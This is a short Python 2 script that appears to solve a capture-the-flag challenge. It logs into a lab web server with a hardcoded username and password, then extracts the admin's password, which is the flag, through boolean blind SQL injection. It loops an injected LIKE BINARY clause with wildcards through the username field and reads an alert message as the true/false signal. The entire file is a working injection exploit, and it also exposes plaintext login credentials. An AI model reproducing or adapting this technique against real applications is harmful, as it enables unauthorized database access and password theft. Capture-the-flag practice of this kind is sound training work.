import urllib
import urllib2
import requests
import sys
url = 'https://172.27.20.32:8443/login.php'
values = {'username': 'sumedh',
          'password': 'CXbXPGbNfXNvBEL'}

session = requests.session()
r = session.post(url, data=values, verify=False)
#print r.content

length = 23 - 6 #for flag{}

def getChar(num):
	if num <= 25:
		return chr(ord('a') + num)
	if num <= 51:
		return chr(ord('A') + (num - 26))
	return str(num - 52)

def getString(i, c):
	ans = ""
	j = 0
	while j < i:
		ans = ans + "_"
		j = j + 1
	ans = ans + c
	j = j + 1
	while j < length:
		ans = ans + "_"
		j = j + 1
	return ans

url = 'https://172.27.20.32:8443/chal9.php'
for i in range(length):
	#print "Finding ", i, "th character"
	for j in range(62):
		c = getChar(j)
		s = getString(i, c)
		#print s
		values = {'username' : 'admin" AND password LIKE binary "flag{' + str(s) + '}" AND username="admin'}
		r = session.post(url, data=values, verify = False)
		if r.content.find("<script>alert('This user exists.')</script>") == 0:
			#print "Character " + str(i) + " is " + str(c)
			sys.stdout.write(c)
			#sys.exit(0)
print "\nPassword Found"